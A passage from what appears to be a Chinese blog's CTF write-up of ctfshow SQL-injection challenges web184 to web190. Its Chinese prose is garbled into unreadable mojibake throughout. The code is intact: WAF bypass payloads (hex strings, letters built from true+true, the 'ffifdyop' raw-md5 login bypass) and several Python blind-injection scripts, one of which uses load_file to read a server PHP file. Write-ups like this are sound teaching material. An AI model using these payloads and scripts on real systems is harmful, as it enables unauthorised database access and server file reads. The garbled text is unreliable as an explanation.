join&quot;Âè≥ËøûÊé•(ÂÖ∂‰ªñ‰æãÂ¶ÇÂ∑¶ËøûÊé•ÂÜÖËøûÊé•ÈÉΩÂèØ)Êù•Êää‰∏§‰∏™Ë°®ËøûÊé•Ëµ∑Êù•ËøõË°åÊü•ËØ¢passÂ≠óÊÆµÔºåÂêéÈù¢ÁöÑÂçïÂºïÂè∑ÂèØ‰ª•Áî®16ËøõÂà∂ÁºñÁ†ÅÁªïËøá</p><blockquote><p><strong>RIGHT JOINÔºàÂè≥ËøûÊé•ÔºâÔºö</strong> Áî®‰∫éËé∑ÂèñÂè≥Ë°®ÊâÄÊúâËÆ∞ÂΩïÔºåÂç≥‰ΩøÂ∑¶Ë°®Ê≤°ÊúâÂØπÂ∫îÂåπÈÖçÁöÑËÆ∞ÂΩï„ÄÇ</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctfshow%    16ËøõÂà∂ÁºñÁ†ÅÂêé--&gt;   0x63746673686f7725</span><br><span class="line"></span><br><span class="line">post:tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web184/%7D2%5D%28GE%286CK%5B5T%240%7DB__O2HU.png" alt=""><br>ÂèëÁé∞ÂèØ‰ª•ÊàêÂäüËøîÂõûÊï∞ÊçÆÔºåÊîπ‰∏Ä‰∏ãËÑöÊú¨ÁªßÁª≠Ë∑ë</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_hex</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># Â≠óÁ¨¶‰∏≤ËΩ¨16ËøõÂà∂</span></span><br><span class="line">    str_16 = binascii.b2a_hex(s.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    str_16 = bytes.decode(str_16)</span><br><span class="line">    res = str_16.replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = <span class="string">&quot;0x&quot;</span> + to_hex(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web185"><a class="header-anchor" href="#web185">¬∂</a>web185</h3><p>ÁúãÂåπÈÖçËßÑÂàôÔºåËøôÊ¨°ÊääÊï∞Â≠óÈÉΩÁªôÂÖ®ban‰∫Ü</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function waf($str)&#123;</span><br><span class="line">   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>ÊÉ≥Âà∞ÁªïËøáÁöÑÊñπÊ≥ïÔºå‰∏Ä‰∏™ÊòØÁî®trueÔºåÂè¶‰∏Ä‰∏™ÊòØÁî®Â≠óÊØç„ÄÇÂú®mysql‰∏≠ÔºåsqlËØ≠Âè•true‰∏∫1Ôºåtrue+true=2ÔºåÊâÄ‰ª•ÈÄöËøáÁõ∏Âä†Ôºå‰ªª‰ΩïÂ≠óÊØçÊàë‰ª¨ÈÉΩÂèØ‰ª•ÊûÑÈÄ†Âá∫Êù•<br>Êää‰∏äÈ¢òËÑöÊú¨Êîπ‰∏Ä‰∏ãÔºåËøôÈáåÁî®concatÊù•ÊääÊØè‰∏™Â≠óÊØçËøûÊé•Ëµ∑Êù•Ôºå‰ΩúÁî®ÊòØËøûÊé•ÊØè‰∏™ÂèÇÊï∞ÊãºÊé•ÊàêÂ≠óÁ¨¶‰∏≤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT CONCAT(&#39;my&#39;, &#39;s&#39;, &#39;ql&#39;);</span><br><span class="line">-&gt; &#39;mysql&#39;</span><br></pre></td></tr></table></figure><p>ÂÜô‰∏Ä‰∏™ËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    str = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            str += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"><span class="comment">#ÊääÊØè‰∏Ä‰∏™Â≠óÁ¨¶ËΩ¨Êç¢ÊàêasciiÁ†ÅÂØπÂ∫îÁöÑÊï∞ÂÄº</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str=<span class="string">&quot;&quot;</span></span><br><span class="line">    str+=<span class="string">&quot;chr(&quot;</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">&quot;,chr(&quot;</span>+createNum(ord(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="web186"><a class="header-anchor" href="#web186">¬∂</a>web186</h3><p>ÂÜç‰∏ä‰∏ÄÈ¢òÂü∫Á°Ä‰∏äÂ§öÂä†‰∫ÜÂá†‰∏™ËøáÊª§Ôºå‰ΩÜÊ≤°ÂΩ±ÂìçÔºåÁªßÁª≠Áî®‰∏ä‰∏ÄÈ¢òËÑöÊú¨ÊâìÈÄö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/8 21:24</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createNum</span>(<span class="params">n</span>):</span></span><br><span class="line">    str = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n - <span class="number">1</span>):</span><br><span class="line">            str += <span class="string">&quot;+true&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_str</span>(<span class="params">s</span>):</span></span><br><span class="line">    str=<span class="string">&quot;&quot;</span></span><br><span class="line">    str+=<span class="string">&quot;chr(&quot;</span>+createNum(ord(s[<span class="number">0</span>]))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str+=<span class="string">&quot;,chr(&quot;</span>+createNum(ord(i))+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3044fe6f-042f-49ea-a38c-5806a2404c7f.challenge.ctf.show:8080/select-waf.php&quot;</span></span><br><span class="line">str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        result = change_str(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="comment">#print(result)</span></span><br><span class="line">        data = &#123;<span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;</span>.format(result)&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;$user_count = 43;&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web187"><a class="header-anchor" href="#web187">¬∂</a>web187</h3><p>ËøôÊ¨°ÂèòÊàêÁôªÂΩïÁöÑ‰∫ÜÔºåÁúãËøîÂõûÈÄªËæë</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D; $_POST[&#39;username&#39;];</span><br><span class="line">$password &#x3D; md5($_POST[&#39;password&#39;],true);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Âè™ÊúâadminÂèØ‰ª•Ëé∑Âæóflag</span><br><span class="line">if($username!&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">	$ret[&#39;msg&#39;]&#x3D;&#39;Áî®Êà∑Âêç‰∏çÂ≠òÂú®&#39;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂæàÊòéÊòæÊ≥®ÂÖ•ÁÇπÊòØmd5()ÂáΩÊï∞ËøôÈáåÔºåÂêéÈù¢Áî®‰∫ÜÂèÇÊï∞trueÔºåËøîÂõûÁöÑÊòØ‰∏Ä‰∏™16‰Ωç‰∫åËøõÂà∂<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web187/SI%24XF70%249%5D1LXD61%25G6I%7DOS.png" alt=""><br>ËÄå‰ªéÁΩë‰∏äÊêúÈõÜÂà∞ÁöÑÊúâ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤<code>ffifdyop</code>ÂæàÁâπÊÆä</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5(<span class="string">&quot;ffifdyop&quot;</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//ÁªìÊûú</span></span><br><span class="line"><span class="string">&#x27;or&#x27;</span><span class="number">6.</span>.....</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞‰ºöËøîÂõûÂºïÂè∑Èó≠ÂêàÂíåorÂπ∂‰∏îÂêéÈù¢ÊòØ‰∏Ä‰∫õ‰∏çÂèØËßÅÂ≠óÁ¨¶ÔºåÂú®mysql‰∏≠ËøõË°åÂ∏ÉÂ∞îÂà§Êñ≠ÁöÑÊó∂ÂÄôÔºåÂè™Ë¶ÅÊòØÊï∞Â≠óÂºÄÂ§¥Â∞±‰ºöË¢´ÂΩì‰ΩútrueÔºåÁªìÊûú‰πüÂ∞±ÊòØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;&#39;&#39;or true</span><br></pre></td></tr></table></figure><p>‰πüÂ∞±ÊòØ‰∏Ä‰∏™‰∏áËÉΩÂØÜÁ†ÅÁôªÂΩïÔºåÂú®ËøîÂõûÂåÖ‰∏≠ÊàêÂäüÊãøÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web187/%5B0NGQWFXFE%5DXOKQX~%25R21V9.png" alt=""></p><h3 id="web188"><a class="header-anchor" href="#web188">¬∂</a>web188</h3><p>Êü•Áúã‰∏Ä‰∏ãsqlËØ≠Âè•ÂíåÂà§Êñ≠ÈÄªËæë</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> $sql = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ÂØÜÁ†ÅÂà§Êñ≠</span></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ÁôªÈôÜÊàêÂäü&#x27;</span>;</span><br><span class="line">      array_push($ret[<span class="string">&#x27;data&#x27;</span>], <span class="keyword">array</span>(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂà∞ÊòØÈÄöËøáÊ£ÄÁ¥¢usernameÊù•ÂàóÂá∫ÂØÜÁ†ÅÔºåÁÑ∂Âêé‰∏Ä‰∏™Âº±ÊØîËæÉÊù•ËøõË°åÂà§Êñ≠ÔºåÂÖàÁªôÂá∫payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;0&amp;password&#x3D;0</span><br></pre></td></tr></table></figure><p>‰ª•ËøôÈÅìÈ¢òÁöÑÊï∞ÊçÆÂ∫ì‰∏∫‰æãÔºåËøô‰∏™Êï∞ÊçÆÂ∫ì‰∏≠ÁöÑÁî®Êà∑ÂêçÈÉΩÊòØ‰ª•Â≠óÊØçÂºÄÂ§¥ÁöÑÊï∞ÊçÆÔºåËÄå‰ª•Â≠óÊØçÂºÄÂ§¥ÁöÑÊï∞ÊçÆÂú®ÂíåÊï∞Â≠óÊØîËæÉÊó∂Ôºå‰ºöË¢´Âº∫Âà∂ËΩ¨Êç¢‰∏∫0ÔºåÂõ†Ê≠§Â∞±‰ºöÁõ∏Á≠âÔºåÂêéÈù¢ÁöÑpass‰πüÊòØ‰∏ÄÊ†∑ÁöÑÈÅìÁêÜ<br>‰ΩÜÊ≥®ÊÑèÔºåÂ¶ÇÊûúÊúâÊüê‰∏™Êï∞ÊçÆ‰∏çÊòØ‰ª•Â≠óÊØçÂºÄÂ§¥ÔºåÊòØÂåπÈÖç‰∏çÊàêÂäüÁöÑÔºåËøôÁßçÊÉÖÂÜµÊÄé‰πàÂäûÔºåÊàë‰ª¨ÂèØ‰ª•Áî®<code>||</code>ËøêÁÆóÁ¨¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1||1&amp;password&#x3D;0</span><br></pre></td></tr></table></figure><h3 id="web189"><a class="header-anchor" href="#web189">¬∂</a>web189</h3><p>ÂºÄÂ±ÄÂ∞±Êù•‰∏™ÊèêÁ§∫ÔºåflagÂú®<code>api/index.php</code>‰∏≠<br>ËøôÊ¨°Â∞ùËØï<code>username=0&amp;password=0</code>ÁôªÂΩïÔºåÂèëÁé∞ÊèêÁ§∫ÂØÜÁ†ÅÈîôËØØÔºåËØ¥ÊòéÊòØÂØÜÁ†ÅË∑ü‰∏ä‰∏ÄÈ¢ò‰∏ç‰∏ÄÊ†∑‰∫ÜÔºå‰∏çÊòØ‰ª•Â≠óÊØçÂºÄÂ§¥ÁöÑÊï∞ÊçÆ„ÄÇÊ†πÊçÆÊèêÁ§∫ÔºåflagÁöÑ‰ΩçÁΩÆÂú®‰∏Ä‰∏™Êñá‰ª∂‰∏≠ÔºåÂèØ‰ª•Áî®<code>load_file</code>Êù•ÈÖçÂêà<code>regexp</code>Êù•ËøõË°åÁõ≤Ê≥®</p><blockquote><p><strong>LOAD_FILE(file_name)Ôºö</strong> ËØªÂèñÊñá‰ª∂Âπ∂ËøîÂõûÊñá‰ª∂ÂÜÖÂÆπ‰∏∫Â≠óÁ¨¶‰∏≤„ÄÇË¶Å‰ΩøÁî®Ê≠§ÂáΩÊï∞ÔºåÊñá‰ª∂ÂøÖÈ°ª‰Ωç‰∫éÊúçÂä°Âô®‰∏ªÊú∫‰∏äÔºåÂøÖÈ°ªÊåáÂÆöÂÆåÊï¥Ë∑ØÂæÑÁöÑÊñá‰ª∂ÔºåËÄå‰∏îÂøÖÈ°ªÊúâFILEÊùÉÈôê„ÄÇ</p><p><strong>regexpÔºö</strong> mysql‰∏≠ÁöÑÊ≠£ÂàôË°®ËææÂºèÊìç‰ΩúÁ¨¶</p></blockquote><p>ÂÆπÊòìÊÉ≥Âà∞ÈªòËÆ§Ë∑ØÂæÑÊòØ<code>/var/www/html/api/index.php</code>ÔºåÂºÄÂßãÂÜô‰∏™ËÑöÊú¨ËøõË°åÁõ≤Ê≥®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/4/15 22:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line">all_str = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;0&#125;&#x27;),0,1)&quot;</span>.format(flag + j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag +=j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h3 id="web190"><a class="header-anchor" href="#web190">¬∂</a>web190</h3></div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">ÊñáÁ´†‰ΩúËÄÖ:</span> <span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">dota_st</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">ÊñáÁ´†ÈìæÊé•:</span> <span class="post-copyright-info"><a href="https://www.wlhhlc.top/posts/14827/">https://www.wlhhlc.top/posts/14827/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">ÁâàÊùÉÂ£∞Êòé:</span> <span class="post-copyright-info">Êú¨ÂçöÂÆ¢ÊâÄÊúâÊñáÁ´†Èô§ÁâπÂà´Â£∞ÊòéÂ§ñÔºåÂùáÈááÁî® <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> ËÆ∏ÂèØÂçèËÆÆ„ÄÇËΩ¨ËΩΩËØ∑Ê≥®ÊòéÊù•Ëá™ <a href="https://www.wlhhlc.top" target="_blank">dota_st</a>ÔºÅ</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/dAEWUr.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> ÊâìËµè<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/mm_facetoface_collect_qrcode_1601714082856.png" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/dota-st/blog_file/mm_facetoface_collect_qrcode_1601714082856.png" alt="ÂæÆ‰ø°"></a><div class="post-qr-code-desc">ÂæÆ‰ø°</div></li><li class="reward-item"><a href="https://cdn.jsdelivr.net/gh/dota-st/blog_file/1601714101044.jpg" rel="external nofollow noreferrer" target="_blank"><img class="post-qr-code-img" src="https://cdn.jsdelivr.net/gh/dota-st/blog_file/1601714101044.jpg" alt="ÊîØ‰ªòÂÆù"></a><div class="post-qr-code-desc">ÊîØ‰ªòÂÆù</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/16813/"><img class="prev-cover" src="https://blog-file-1302856486.file.myqcloud.com/ctf-php%E4%B8%ADmd5%E7%B1%BB%E5%9E%8B%E6%B1%87%E6%80%BB/B%5B%60EVIR%600%28Y0NH_PR%5B%24%284PL.png" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">‰∏ä‰∏ÄÁØá</div><div class="prev_info">php-md5Á±ªÂûãÈ¢òÁõÆÊ±áÊÄª</div></div></a></div><div class="next-post pull-right"><a href="/posts/16692/"><img class="next-cover" src="https://blog-file-1302856486.file.myqcloud.com/AoiAWD/20180202013633093309.jpg" onerror='onerror=null,src="/img/404.jpg"'><div class="pagination-info"><div class="label">‰∏ã‰∏ÄÁØá</div><div class="next_info">AoiAWD-ËêåÊñ∞ÁöÑÂæóÂàÜÂà©Âô®</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i> <span>Áõ∏ÂÖ≥Êé®Ëçê</span></div><div class="relatedPosts-list"><div><a href="/posts/25127/" title="CtfShowËêåÊñ∞Âå∫WP"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/ctfshow%E8%90%8C%E6%96%B0/205458-155593769824cb.jpg"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">CtfShowËêåÊñ∞Âå∫WP</div></div></a></div><div><a href="/posts/14571/" title="ÊîªÈò≤‰∏ñÁïåWebÂå∫~ÊåÅÁª≠Êõ¥Êñ∞‰∏≠ÔºÅ"><img class="cover" src="https://blog-file-1302856486.file.myqcloud.com/%60%5DN%40CMBE270%25L%408DO%7D%28_N4B.png"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 